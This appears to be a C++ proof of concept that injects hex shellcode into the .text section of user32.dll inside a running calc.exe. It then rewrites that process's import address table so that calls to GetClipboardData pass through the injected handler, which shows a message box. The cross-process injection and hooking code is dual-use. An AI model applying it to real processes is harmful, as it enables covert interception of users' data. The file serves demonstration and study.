// IATHookingRevisited.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <Tlhelp32.h>
#include "IATHookingRevisited.h"

#define BUFFER_SIZE 0x2000

DWORD FindRemotePEB(HANDLE hProcess)
{
	HMODULE hNTDLL = LoadLibraryA("ntdll");

	if (!hNTDLL)
		return 0;

	FARPROC fpNtQueryInformationProcess = GetProcAddress
	(
		hNTDLL,
		"NtQueryInformationProcess"
	);

	if (!fpNtQueryInformationProcess)
		return 0;

	NtQueryInformationProcess ntQueryInformationProcess = 
		(NtQueryInformationProcess)fpNtQueryInformationProcess;

	PROCESS_BASIC_INFORMATION* pBasicInfo = 
		new PROCESS_BASIC_INFORMATION();

	DWORD dwReturnLength = 0;

	ntQueryInformationProcess
	(
		hProcess, 
		0, 
		pBasicInfo, 
		sizeof(PROCESS_BASIC_INFORMATION), 
		&dwReturnLength
	);

	return pBasicInfo->PebBaseAddress;
}

PEB* ReadRemotePEB(HANDLE hProcess)
{
	DWORD dwPEBAddress = FindRemotePEB(hProcess);

	PEB* pPEB = new PEB();

	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		(LPCVOID)dwPEBAddress,
		pPEB,
		sizeof(PEB),
		0
	);

	if (!bSuccess)
		return 0;

	return pPEB;
}

PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
{
	BYTE* lpBuffer = new BYTE[BUFFER_SIZE];

	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		lpImageBaseAddress,
		lpBuffer,
		BUFFER_SIZE,
		0
	);

	if (!bSuccess)
		return 0;	

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;

	PLOADED_IMAGE pImage = new LOADED_IMAGE();

	pImage->FileHeader = 
		(PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);

	pImage->NumberOfSections = 
		pImage->FileHeader->FileHeader.NumberOfSections;

	pImage->Sections = 
		(PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + 
		sizeof(IMAGE_NT_HEADERS32));

	return pImage;
}


PIMAGE_SECTION_HEADER FindSectionHeaderByName(PIMAGE_SECTION_HEADER pHeaders, 
											  DWORD dwNumberOfSections, char* pName)
{
	PIMAGE_SECTION_HEADER pHeaderMatch = 0;

	for (DWORD i = 0; i < dwNumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER pHeader = &pHeaders[i];

		if (!_stricmp((char*)pHeader->Name, pName))
		{
			pHeaderMatch = pHeader;
			break;
		}
	}	

	return pHeaderMatch;
}


PIMAGE_IMPORT_DESCRIPTOR ReadRemoteImportDescriptors(HANDLE hProcess, 
													 LPCVOID lpImageBaseAddress,
													 PIMAGE_DATA_DIRECTORY pImageDataDirectory)
{	
	IMAGE_DATA_DIRECTORY importDirectory = pImageDataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptors = 
		new IMAGE_IMPORT_DESCRIPTOR[importDirectory.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR)];

	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		(LPCVOID)((DWORD)lpImageBaseAddress + importDirectory.VirtualAddress),
		pImportDescriptors,
		importDirectory.Size,		
		0
	);

	if (!bSuccess)
		return 0;

	return pImportDescriptors;
}

char* ReadRemoteDescriptorName(HANDLE hProcess, LPCVOID lpImageBaseAddress, 
							   PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor)
{
	char* pBuffer = new char[BUFFER_SIZE];

	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		(LPCVOID)((DWORD)lpImageBaseAddress + pImageImportDescriptor->Name),
		pBuffer,
		BUFFER_SIZE,		
		0
	);

	if (!bSuccess)
		return 0;

	return pBuffer;
}

PIMAGE_THUNK_DATA32 ReadRemoteILT(HANDLE hProcess, LPCVOID lpImageBaseAddress, 
								  PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor)
{
	DWORD dwThunkArrayLen = BUFFER_SIZE / sizeof(IMAGE_THUNK_DATA32);

	PIMAGE_THUNK_DATA32 pILT = new IMAGE_THUNK_DATA32[dwThunkArrayLen];

	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		(LPCVOID)((DWORD)lpImageBaseAddress + 
		pImageImportDescriptor->OriginalFirstThunk),
		pILT,
		BUFFER_SIZE,		
		0
	);

	if (!bSuccess)
		return 0;

	return pILT;
}


PIMAGE_THUNK_DATA32 ReadRemoteIAT(HANDLE hProcess, LPCVOID lpImageBaseAddress, 
								  PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor)
{
	DWORD dwThunkArrayLen = BUFFER_SIZE / sizeof(IMAGE_THUNK_DATA32);

	PIMAGE_THUNK_DATA32 pIAT = new IMAGE_THUNK_DATA32[dwThunkArrayLen];

	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		(LPCVOID)((DWORD)lpImageBaseAddress + 
		pImageImportDescriptor->FirstThunk),
		pIAT,
		BUFFER_SIZE,		
		0
	);

	if (!bSuccess)
		return 0;

	return pIAT;
}

PIMAGE_IMPORT_BY_NAME ReadRemoteImportByName(HANDLE hProcess, 
											 LPCVOID lpImageBaseAddress, 
											 PIMAGE_THUNK_DATA32 pImageThunk)
{
	BYTE* lpImportNameBuffer = new BYTE[BUFFER_SIZE];
	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		(LPCVOID)((DWORD)lpImageBaseAddress + pImageThunk->u1.AddressOfData),
		lpImportNameBuffer,
		BUFFER_SIZE,		
		0
	);

	if (!bSuccess)
		return 0;

	PIMAGE_IMPORT_BY_NAME pImportByName = 
		(PIMAGE_IMPORT_BY_NAME)lpImportNameBuffer;

	return pImportByName;
}

PPEB_LDR_DATA ReadRemoteLoaderData(HANDLE hProcess, PPEB pPEB)
{
	PPEB_LDR_DATA pLoaderData = new PEB_LDR_DATA();

	BOOL bSuccess = ReadProcessMemory
	(
		hProcess,
		pPEB->LoaderData,
		pLoaderData,
		sizeof(PEB_LDR_DATA),
		0
	);

	if (!bSuccess)
		return 0;

	return pLoaderData;
}

PVOID FindRemoteImageBase(HANDLE hProcess, PPEB pPEB, char* pModuleName)
{
	PPEB_LDR_DATA pLoaderData = ReadRemoteLoaderData(hProcess, pPEB);

	PVOID firstFLink = pLoaderData->InLoadOrderModuleList.Flink;
	PVOID fLink = pLoaderData->InLoadOrderModuleList.Flink;

	PLDR_MODULE pModule = new LDR_MODULE();

	do 
	{
		BOOL bSuccess = ReadProcessMemory
		(
			hProcess,
			fLink,
			pModule,
			sizeof(LDR_MODULE),
			0
		);

		if (!bSuccess)
			return 0;

		PWSTR pwBaseDllName = new WCHAR[pModule->BaseDllName.MaximumLength];

		bSuccess = ReadProcessMemory
		(
			hProcess,
			pModule->BaseDllName.Buffer,
			pwBaseDllName,
			pModule->BaseDllName.Length + 2,
			0
		);

		if (bSuccess)
		{
			size_t sBaseDllName = pModule->BaseDllName.Length / 2 + 1;
			char* pBaseDllName = new char[sBaseDllName];

			WideCharToMultiByte
			(
				CP_ACP, 
				0, 
				pwBaseDllName, 
				pModule->BaseDllName.Length + 2, 
				pBaseDllName,
				sBaseDllName,
				0,
				0
			);

			if (!_stricmp(pBaseDllName, pModuleName))
				return pModule->BaseAddress;
		}

		fLink = pModule->InLoadOrderModuleList.Flink;
	} while (pModule->InLoadOrderModuleList.Flink != firstFLink);

	return 0;
}

BOOL PatchDWORD(BYTE* pBuffer, DWORD dwBufferSize, DWORD dwOldValue, 
				DWORD dwNewValue)
{
	for (int i = 0; i < dwBufferSize - 4; i++)
	{		
		if (*(PDWORD)(pBuffer + i) == dwOldValue)
		{
			memcpy(pBuffer + i, &dwNewValue, 4);

			return TRUE;
		}
	}

	return FALSE;
}

BOOL HookFunction(DWORD dwProcessId, CHAR* pModuleName, CHAR* pFunctionName, 
				  PVOID pHandler, DWORD dwHandlerSize)
{
	HANDLE hProcess = OpenProcess
	(
		PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION | 
			PROCESS_VM_READ | PROCESS_VM_WRITE, 
		0, 
		dwProcessId
	);

	if (!hProcess)
	{
		printf("Error opening process\r\n");
		return FALSE;
	}

	DWORD dwPEBAddress = FindRemotePEB(hProcess);

	if (!dwPEBAddress)
	{
		printf("Error finding remote PEB\r\n");
		return FALSE;
	}

	PEB* pPEB = ReadRemotePEB(hProcess);

	if (!pPEB)
	{
		printf("Error reading remote PEB\r\n");
		return FALSE;
	}

	PLOADED_IMAGE pImage = ReadRemoteImage(hProcess, pPEB->ImageBaseAddress);

	if (!pImage)
	{
		printf("Error reading remote image\r\n");
		return FALSE;
	}

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptors = ReadRemoteImportDescriptors
	(
		hProcess, 
		pPEB->ImageBaseAddress,
		pImage->FileHeader->OptionalHeader.DataDirectory
	);

	if (!pImportDescriptors)
	{
		printf("Error reading remote import descriptors\r\n");
		return FALSE;
	}

	for (DWORD i = 0; i < 0x2000; i++)
	{
		IMAGE_IMPORT_DESCRIPTOR descriptor = pImportDescriptors[i];

		char* pName = ReadRemoteDescriptorName
		(
			hProcess,
			pPEB->ImageBaseAddress,
			&descriptor
		);

		if (!pName)
		{
			printf("Error reading remote descriptor name\r\n");
			return FALSE;
		}

		BOOL bSuccess;

		if (!_stricmp(pName, pModuleName))
		{
			DWORD dwThunkArrayLen = BUFFER_SIZE / sizeof(IMAGE_THUNK_DATA32);

			PIMAGE_THUNK_DATA32 pILT = ReadRemoteILT
			(
				hProcess, 
				pPEB->ImageBaseAddress, 
				&descriptor
			);

			if (!pILT)
			{
				printf("Error reading remote ILT\r\n");
				return FALSE;
			}

			DWORD dwOffset = 0;

			for (dwOffset = 0; dwOffset < dwThunkArrayLen; dwOffset++)
			{
				PIMAGE_IMPORT_BY_NAME pImportByName = ReadRemoteImportByName
				(
					hProcess, 
					pPEB->ImageBaseAddress, 
					&pILT[dwOffset]
				);

				if (!pImportByName)
				{
					printf("Error reading remote import by name\r\n");
					return FALSE;
				}

				if (!strcmp((char*)pImportByName->Name, pFunctionName))
					break;				
			}

			PIMAGE_THUNK_DATA32 pIAT = ReadRemoteIAT
			(
				hProcess,
				pPEB->ImageBaseAddress,
				&descriptor
			);

			if (!pIAT)
			{
				printf("Error reading remote IAT\r\n");
				return FALSE;
			}

			DWORD dwOriginalAddress = pIAT[dwOffset].u1.AddressOfData;

			printf("Original import address: 0x%p\r\n", dwOriginalAddress);


			PVOID pImportImageBase = FindRemoteImageBase
			(
				hProcess, 
				pPEB, 
				pModuleName
			);

			if (!pImportImageBase)
			{
				printf("Could not find remote image base for %s\r\n", pModuleName);
				return FALSE;
			}

			PLOADED_IMAGE pImportImage = ReadRemoteImage
			(
				hProcess,
				pImportImageBase
			);

			if (!pImportImage)
			{
				printf("Could not find remote image at 0x%p\r\n", pImportImageBase);
				return FALSE;
			}

			PIMAGE_SECTION_HEADER pImportTextHeader = FindSectionHeaderByName
			(
				pImportImage->Sections, 
				pImportImage->NumberOfSections, 
				".text"
			);

			if (!pImportTextHeader)
			{
				printf("Could not find section header\r\n");
				return FALSE;
			}

			BYTE* pHandlerBuffer = new BYTE[dwHandlerSize];

			memcpy(pHandlerBuffer, pHandler, dwHandlerSize);

			BOOL bSuccess = PatchDWORD
			(
				pHandlerBuffer, 
				dwHandlerSize, 
				0xDEADBEEF, 
				dwOriginalAddress
			);

			if (!bSuccess)
			{
				printf("Error patching import address into handler");
				return FALSE;
			}

			DWORD dwHandlerAddress = (DWORD)pImportImageBase + 
				pImportTextHeader->VirtualAddress + 
				pImportTextHeader->SizeOfRawData - 
				dwHandlerSize;

			// Write handler to text section
			bSuccess = WriteProcessMemory
			(
				hProcess,
				(LPVOID)dwHandlerAddress, 
				pHandlerBuffer, 
				dwHandlerSize, 
				0
			);

			if (!bSuccess)
			{
				printf("Error writing process memory");
				return FALSE;
			}

			printf("Handler address: 0x%p\r\n", dwHandlerAddress);

			LPVOID pAddress = (LPVOID)((DWORD)pPEB->ImageBaseAddress + 
				descriptor.FirstThunk + (dwOffset * sizeof(IMAGE_THUNK_DATA32)));

			// Write IAT
			bSuccess = WriteProcessMemory
			(
				hProcess,
				pAddress,
				&dwHandlerAddress, 
				4, 
				0
			);

			if (!bSuccess)
			{
				printf("Error writing process memory");
				return FALSE;
			}	

			return TRUE;
		}
		else if (!descriptor.Characteristics)
			return FALSE;
	}

	return FALSE;
}



int GetCalcId()
{
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return 0;
	}

	do
	{
		if (!_wcsicmp(pe32.szExeFile, L"calc.exe"))
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;		
		}

	} while(Process32Next(hProcessSnap, &pe32) );

	CloseHandle(hProcessSnap);

	return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
	char* handler =
		"\x55\x31\xdb\xeb\x55\x64\x8b\x7b"
		"\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b"
		"\x47\x08\x8b\x77\x20\x8b\x3f\x80"
		"\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
		"\x78\x3c\x8b\x57\x78\x01\xc2\x8b"
		"\x7a\x20\x01\xc7\x89\xdd\x8b\x34"
		"\xaf\x01\xc6\x45\x8b\x4c\x24\x04"
		"\x39\x0e\x75\xf2\x8b\x4c\x24\x08"
		"\x39\x4e\x04\x75\xe9\x8b\x7a\x24"
		"\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a"
		"\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01"
		"\xf8\xc3\x68\x4c\x69\x62\x72\x68"
		"\x4c\x6f\x61\x64\xe8\x9c\xff\xff"
		"\xff\x31\xc9\x66\xb9\x33\x32\x51"
		"\x68\x75\x73\x65\x72\x54\xff\xd0"
		"\x50\x68\x72\x6f\x63\x41\x68\x47"
		"\x65\x74\x50\xe8\x7d\xff\xff\xff"
		"\x59\x59\x59\x68\xf0\x86\x17\x04"
		"\xc1\x2c\x24\x04\x68\x61\x67\x65"
		"\x42\x68\x4d\x65\x73\x73\x54\x51"
		"\xff\xd0\x53\x53\x53\x53\xff\xd0"
		"\xb9\x07\x00\x00\x00\x58\xe2\xfd"
		"\x5d\xb8\xef\xbe\xad\xde\xff\xe0";

	DWORD dwProcessId = GetCalcId();

	HookFunction
	(
		dwProcessId, 
		"user32.dll", 
		"GetClipboardData", 
		handler, 
		0x100
	);

	system("pause");

	return 0;
}

